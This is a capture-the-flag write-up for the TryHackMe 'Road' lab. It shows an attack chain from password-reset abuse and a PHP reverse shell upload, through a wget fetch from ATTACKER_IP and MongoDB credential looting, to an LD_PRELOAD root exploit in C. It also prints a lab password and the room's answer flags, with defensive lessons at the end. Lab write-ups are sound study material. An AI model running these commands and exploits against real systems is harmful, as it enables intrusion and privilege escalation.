# TryHackMe — Road (Medium) Write-up

## 📝 Overview
- **Room:** Road  
- **Difficulty:** Medium  
- **Date:** 12.09.2025  
- **Target IP:** xxx.xxx.xxx.xxx  

In this room, I exploited a vulnerable web application and leveraged a misconfigured MongoDB service to gain SSH access, finally escalating privileges to root through an LD_PRELOAD misconfiguration.  

---

## 🔎 Enumeration
We start with a full port scan:  

```bash
sudo nmap -sC -sV -Pn -p- xxx.xxx.xxx.xxx
```

**Results:**
- **22/tcp → SSH**  
- **80/tcp → HTTP**

---

## 🌐 Web Enumeration
On port 80, the website displayed a basic "Sky" page.  

Directory brute force with Gobuster:  

```bash
gobuster dir -u http://xxx.xxx.xxx.xxx -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/phpmyadmin`
- `/index.php`
- `/v2` → redirected to `/v2/admin/login.html`

---

## 🔓 Exploitation
At `/v2/admin/login.html`, I found a login form with registration enabled.  

### Step 1 — Registration
I registered a new account and logged in. In the profile section, there was an option to **upload an image**.  

### Step 2 — Password reset abuse
I discovered the email `admin@sky.thm`. Using **Burp Suite**, I intercepted the password reset request and changed my email parameter to `admin@sky.thm`.  

This gave me **admin access**.  

### Step 3 — File upload RCE
I uploaded a **PHP reverse shell** from PentestMonkey.  

Listener:  
```bash
nc -lvnp 4444
```

Shell uploaded to `/v2/profileimages/shell.php` → accessed in browser:  

```
http://xxx.xxx.xxx.xxx/v2/profileimages/shell.php
```

Shell obtained as `www-data`.  

To stabilize:  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## ⚙️ Privilege Escalation

### Step 1 — www-data → webdeveloper
I uploaded **LinPEAS**:  

```bash
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

It revealed MongoDB. Connected locally:  

```bash
mongo
show databases
use backup
db.user.find()
```

**Credentials found:**  
- User: `webdeveloper`  
- Password: `BahamasChapp123!@#`  

SSH login:  
```bash
ssh webdeveloper@xxx.xxx.xxx.xxx
```

---

### Step 2 — webdeveloper → root
Check sudo:  
```bash
sudo -l
```

Found: `/usr/bin/sky_backup_utility` with **LD_PRELOAD** enabled.  

Exploit:  

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Compile:  
```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
```

Run:  
```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

→ Root shell obtained 🎉  

---

## 🎯 Flags
```bash
cat /home/webdeveloper/user.txt
```
**User flag:** `63191e4ece37523c9fe6bb62a5364d45`  

```bash
cat /root/root.txt
```
**Root flag:** `3a62d897c40a815ecbe267df2f533ac6`  

---

## ✅ Lessons Learned
- Always validate password reset logic.  
- Sanitize and restrict file uploads.  
- Do not expose MongoDB without authentication.  
- Remove dangerous sudo configurations like `env_keep+=LD_PRELOAD`.  

---

## 🔚 Conclusion
This machine clearly demonstrates **attack chaining**:  
1. Weak password reset → admin access  
2. File upload → RCE (www-data)  
3. MongoDB misconfig → SSH creds (webdeveloper)  
4. LD_PRELOAD misconfiguration → root  

Final result → **Full compromise of the system**.
